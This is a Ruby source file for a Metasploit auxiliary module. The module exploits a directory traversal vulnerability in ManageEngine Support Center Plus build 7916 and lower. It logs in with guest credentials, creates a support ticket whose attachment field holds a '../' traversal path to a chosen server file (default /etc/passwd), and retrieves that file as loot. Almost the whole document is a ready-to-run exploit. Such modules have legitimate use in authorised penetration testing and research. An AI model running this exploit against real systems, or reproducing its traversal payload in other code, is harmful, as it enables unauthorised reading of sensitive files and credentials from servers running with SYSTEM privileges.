##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Support Center Plus 7916 Directory Traversal",
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in ManageEngine
        Support Center Plus build 7916 and lower. The module will create a support ticket
        as a normal user, attaching a link to a file on the server. By requesting our
        own attachment, it's possible to retrieve any file on the filesystem with the same
        privileges as Support Center Plus is running. On Windows this is always with SYSTEM
        privileges.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
      'References'     =>
        [
        ],
      'Platform'       => ['java'],
      'Arch'           => ARCH_JAVA,
      'Targets'        => 'Support Center Plus',
      'Privileged'     => true,
      'DisclosureDate' => "Jan 28 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),
          OptString.new('RPORT', [true, 'Remote port of the Support Center Plus installation', '8080']),
          OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
          OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
          OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
        ], self.class)
  end

  def run_host(ip)
    uri = target_uri.path
    peer = "#{ip}:#{rport}"

    print_status("#{peer} - Retrieving cookie")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, ""),
    })

    if res.code == 200
      if (res.headers['Set-Cookie'] =~ /JSESSIONID=([a-zA-Z0-9]+)/)
        session = $1
        print_status("#{peer} - Session cookie is [ #{session} ]")
      else
        print_error("#{peer} - Session cookie not found!")
      end
    else
      print_error("#{peer} - Server returned #{res.code.to_s}")
    end

    post_data = "j_username=#{datastore['USER']}&j_password=#{datastore['PASS']}&logonDomainName=undefined&sso_status=false&loginButton=Login"
      print_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri(uri, "j_security_check"),
        'cookie' => "JSESSIONID=#{session}",
        'data'   => post_data
      })

    if not res or res.code != 302
      print_error("#{peer} - Login was not succesful!")
      return
    else
      print_status("#{peer} - Login succesful")
    end

    randomname = Rex::Text.rand_text_alphanumeric(10)
    print_status("#{peer} - Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "WorkOrder.do"),
      'cookie' => "JSESSIONID=#{session}",
      'vars_post' =>
        {
          'reqTemplate' => '',
          'prodId' => '0',
          'priority' => '2',
          'reqID' => '2',
          'usertypename' => 'Requester',
          'reqName' => 'Guest',
          'category' => '0',
          'item' => '0',
          'subCategory' => '0',
          'title' => randomname,
          'description' => randomname,
          'MOD_IND' => 'WorkOrder',
          'FORMNAME' => 'WorkOrderForm',
          'attach' => "/../../../../../../../../../../../..#{datastore['FILE']}",
          'attPath' => '',
          'component' => 'Request',
          'attSize' => Rex::Text.rand_text_numeric(8),
          'attachments' => randomname,
          'autoCCList' => '',
          'addWO' => 'addWO'
        }
      })

    if not res or res.code != 200
      print_error("#{peer} - Ticket not created due to error!")
      return
    else
      print_status("#{peer} - Ticket created")
      if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
        fileid = $1
        print_status("#{peer} - File ID is [ #{fileid} ]")
        fileauthkey = $2
        print_status("#{peer} - Auth Key is [ #{fileauthkey} ]")
      else
        print_error("#{peer} - File ID and AuthKey not found!")
      end
    end

    print_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey}")
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.  Print the status code for debugging purposes.
    if res and res.code != 200
      print_error("#{peer} - Server returned #{res.code.to_s}")
    else
      data = res.body
      p = store_loot(
        'manageengine.supportcenterplus',
        'application/octet-stream',
        ip,
        data,
        datastore['FILE']
      )
      print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
    end
  end
end

